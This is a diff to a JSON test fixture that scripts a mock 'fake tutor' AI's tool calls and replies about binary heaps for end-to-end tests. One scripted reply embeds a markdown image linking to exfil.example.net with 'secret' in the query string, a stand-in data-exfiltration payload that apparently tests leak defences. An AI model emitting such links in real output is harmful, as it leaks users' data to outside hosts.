@@ -2,7 +2,12 @@
   {
     "match": "first passage",
     "steps": [
-      { "tool": "search_article", "input": { "query": "heap" } },
+      {
+        "tool": "search_article",
+        "input": {
+          "query": "heap"
+        }
+      },
       {
         "text": "A heap keeps the **smallest** item on top. ![leak](https://exfil.example.net/e2e.png?d=secret)"
       }
@@ -11,9 +16,76 @@
   {
     "match": "second passage",
     "steps": [
-      { "tool": "read_article_section", "input": { "heading": "Removing" } },
-      { "text": "Removing the top takes **log n** steps." }
+      {
+        "tool": "read_article_section",
+        "input": {
+          "heading": "Removing"
+        }
+      },
+      {
+        "text": "Removing the top takes **log n** steps."
+      }
     ]
   },
-  [{ "text": "This is the fake tutor. It has no script for this message." }]
+  {
+    "match": "^Plan a series of 2",
+    "steps": [
+      {
+        "tool": "plan_series",
+        "input": {
+          "title": "Heaps in practice",
+          "parts": [
+            {
+              "title": "Heap basics",
+              "summary": "The array layout and the heap property."
+            },
+            {
+              "title": "Heap sort",
+              "summary": "Sorting with a heap in place."
+            }
+          ]
+        }
+      },
+      {
+        "text": "Planned."
+      }
+    ]
+  },
+  {
+    "match": "Its title: Heap basics",
+    "steps": [
+      {
+        "tool": "save_article",
+        "input": {
+          "title": "x",
+          "tags": ["heaps"],
+          "body": "A priority queue hands back the smallest item first. A binary heap stores it as a complete tree in an array, so the parent of index i sits at (i - 1) // 2 and its children at 2i + 1 and 2i + 2. Every parent is no larger than its children, which keeps the minimum at index 0.\n\n## Why it is fast\n\nPushing appends and sifts up; popping swaps the last item to the root and sifts down. Each takes O(log n) steps because the tree is balanced.\n"
+        }
+      },
+      {
+        "text": "Saved."
+      }
+    ]
+  },
+  {
+    "match": "Its title: Heap sort",
+    "steps": [
+      {
+        "tool": "save_article",
+        "input": {
+          "title": "x",
+          "tags": ["heaps"],
+          "body": "A priority queue hands back the smallest item first. A binary heap stores it as a complete tree in an array, so the parent of index i sits at (i - 1) // 2 and its children at 2i + 1 and 2i + 2. Every parent is no larger than its children, which keeps the minimum at index 0.\n\n## Why it is fast\n\nPushing appends and sifts up; popping swaps the last item to the root and sifts down. Each takes O(log n) steps because the tree is balanced.\n"
+        }
+      },
+      {
+        "text": "Saved."
+      }
+    ]
+  },
+  [
+    {
+      "text": "This is the fake tutor. It has no script for this message."
+    }
+  ]
 ]
